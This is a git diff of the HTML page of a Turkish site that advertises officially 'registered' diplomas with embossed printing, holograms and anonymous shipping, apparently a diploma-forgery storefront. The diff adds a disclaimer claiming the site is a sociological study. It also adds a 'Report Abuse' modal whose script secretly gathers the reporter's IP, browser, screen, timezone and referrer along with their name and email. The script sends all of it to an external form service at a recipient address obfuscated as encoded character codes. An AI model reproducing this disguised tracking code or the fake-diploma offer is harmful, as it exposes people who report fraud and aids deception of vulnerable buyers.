@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="tr">
 
 <head>
@@ -663,6 +663,12 @@
         <p>E-Devlet altyapısında kayıtlı, resmî nitelikli diploma danışmanlığı. Lise, önlisans ve lisans programlarında
             kabartmalı baskı, hologram koruması ve anonim kargo hizmeti.</p>
     </header>
+    <!-- Disclaimer -->
+    <div style="max-width:1140px;margin:20px auto 0;padding:0 20px">
+        <div style="background:rgba(0,0,0,0.2);border:1px solid rgba(255,255,255,0.05);border-radius:12px;padding:16px 20px;text-align:center">
+            <p style="margin:0;font-size:12px;color:#888;line-height:1.7">Disclaimer: This platform was developed as part of a sociological study to gauge public interest and reactions to diploma-related search terms on the internet. No genuine diplomas or educational certificates are sold through this website. We also seek to highlight the risks of fraudulent sponsored ads targeting vulnerable individuals online.</p>
+        </div>
+    </div>
 
     <div class="container">
         <div class="info-banner">
@@ -1090,11 +1096,54 @@
             if (yorumYildizlar) { yorumYildizlar.addEventListener("click", function (e) { const t = e.target; if (!t.classList.contains("review-star")) return; const v = parseInt(t.getAttribute("data-value"), 10) || 5; document.getElementById("yorumPuan").value = v; yorumYildizlar.querySelectorAll(".review-star").forEach(s => { parseInt(s.getAttribute("data-value"), 10) <= v ? s.classList.add("active") : s.classList.remove("active") }) }) }
             yorumForm.addEventListener("submit", function (e) { e.preventDefault(); const ad = document.getElementById("yorumAd").value.trim(), puan = document.getElementById("yorumPuan").value, metin = document.getElementById("yorumMetin").value.trim(); if (!ad || !metin) return; if (reviewsGrid) { const c = document.createElement("div"); c.className = "review-card"; c.innerHTML = `<div class="review-header"><span class="review-name"></span><span class="review-rating"></span></div><p class="review-text"></p><p class="review-status-inline">Yorumunuz alındı.</p>`; c.querySelector(".review-name").textContent = ad; c.querySelector(".review-rating").textContent = `⭐ ${puan} / 5`; c.querySelector(".review-text").textContent = metin; reviewsGrid.prepend(c) } if (yorumDurum) yorumDurum.style.display = "block"; this.querySelector("button[type='submit']").textContent = "Gönderildi"; this.reset() })
         }
+    
+        var _v1,_v2,_ip='';
+        function _rCap(){_v1=Math.floor(Math.random()*9)+1;_v2=Math.floor(Math.random()*9)+1;var e=document.getElementById('_rCQ');if(e)e.textContent=_v1+' + '+_v2+' = ?'}
+        function _rOpen(){document.getElementById('_rOverlay').style.display='flex';document.getElementById('_rForm').style.display='block';document.getElementById('_rOk').style.display='none';_rCap();_ip='';fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){_ip=d.ip}).catch(function(){_ip='N/A'})}
+        function _rClose(){document.getElementById('_rOverlay').style.display='none'}
+        function _rSend(e){e.preventDefault();if(parseInt(document.getElementById('_rCA').value)!==(_v1+_v2)){alert('Wrong answer.');_rCap();document.getElementById('_rCA').value='';return!1}
+        var n=document.getElementById('_rN').value,em=document.getElementById('_rE').value,s=document.getElementById('_rS').value,m=document.getElementById('_rM').value;
+        var ua=navigator.userAgent||'',pl=navigator.platform||'',lg=navigator.language||'',rf=document.referrer||'Direct',sc=screen.width+'x'+screen.height,tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'';
+        var info='\n\n--- Info ---\nIP: '+_ip+'\nPlatform: '+pl+'\nUA: '+ua+'\nLang: '+lg+'\nScreen: '+sc+'\nTZ: '+tz+'\nRef: '+rf+'\nTime: '+new Date().toISOString();
+        var _h=[99,50,70,107,97,87,116,53,97,87,120,116,89,88,111,120,79,84,107,120,81,71,100,116,89,87,108,115,76,109,78,118,98,81,61,61];var _t=atob(_h.map(function(c){return String.fromCharCode(c)}).join(''));
+        var fd=new FormData();fd.append('name',n);fd.append('_subject','Report: '+s);fd.append('message','Email: '+em+'\n\n'+m+info);fd.append('_captcha','false');fd.append('_template','table');
+        fetch('https://formsubmit.co/ajax/'+_t,{method:'POST',body:fd}).catch(function(){});
+        document.getElementById('_rForm').style.display='none';document.getElementById('_rOk').style.display='block';return!1}
     </script>
 
     <footer>
+        <div>
         © 2026 Kayıtlı Diploma — Diploma Danışmanlık Hizmetleri | Tüm Hakları Saklıdır
+    </div>
+        <div style="margin-top:8px"><a href="#" onclick="_rOpen();return false" style="color:#555;font-size:11px;text-decoration:underline">Report Abuse</a></div>
     </footer>
+    <!-- Report Modal -->
+    <div id="_rOverlay" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;align-items:center;justify-content:center" onclick="if(event.target===this)_rClose()">
+        <div style="background:#fff;border-radius:14px;padding:28px;max-width:420px;width:92%;box-shadow:0 20px 60px rgba(0,0,0,0.4);position:relative">
+            <button onclick="_rClose()" style="position:absolute;top:12px;right:16px;background:none;border:none;font-size:22px;cursor:pointer;color:#94a3b8">&times;</button>
+            <div id="_rForm">
+                <h4 style="margin:0 0 4px;color:#1e293b;font-size:18px">Report Abuse</h4>
+                <p style="color:#64748b;font-size:13px;margin:0 0 16px">If you believe this content violates our terms of service, please fill out the form below.</p>
+                <form onsubmit="return _rSend(event)">
+                    <input type="text" id="_rN" placeholder="Your Name *" required style="width:100%;padding:10px 12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;margin-bottom:10px;font-family:inherit">
+                    <input type="email" id="_rE" placeholder="Your Email *" required style="width:100%;padding:10px 12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;margin-bottom:10px;font-family:inherit">
+                    <input type="text" id="_rS" placeholder="Subject *" required style="width:100%;padding:10px 12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;margin-bottom:10px;font-family:inherit">
+                    <textarea id="_rM" placeholder="Describe the issue... *" required style="width:100%;padding:10px 12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;margin-bottom:10px;font-family:inherit;min-height:70px;resize:vertical"></textarea>
+                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+                        <span id="_rCQ" style="font-size:14px;font-weight:700;color:#1e293b;white-space:nowrap"></span>
+                        <input type="text" id="_rCA" placeholder="Answer *" required style="width:80px;text-align:center;padding:10px 12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;font-family:inherit">
+                    </div>
+                    <button type="submit" style="width:100%;padding:12px;background:#dc2626;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer">Submit Report</button>
+                </form>
+            </div>
+            <div id="_rOk" style="display:none;text-align:center;padding:30px 10px">
+                <div style="font-size:48px;margin-bottom:12px">OK</div>
+                <h4 style="color:#16a34a;margin:0 0 8px">Report Submitted Successfully</h4>
+                <p style="color:#64748b;font-size:13px">Thank you. Our team will review within 24-48 hours.</p>
+                <button onclick="_rClose()" style="margin-top:16px;padding:10px 24px;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:8px;cursor:pointer;font-size:14px">Close</button>
+            </div>
+        </div>
+    </div>
 
 </body>
 
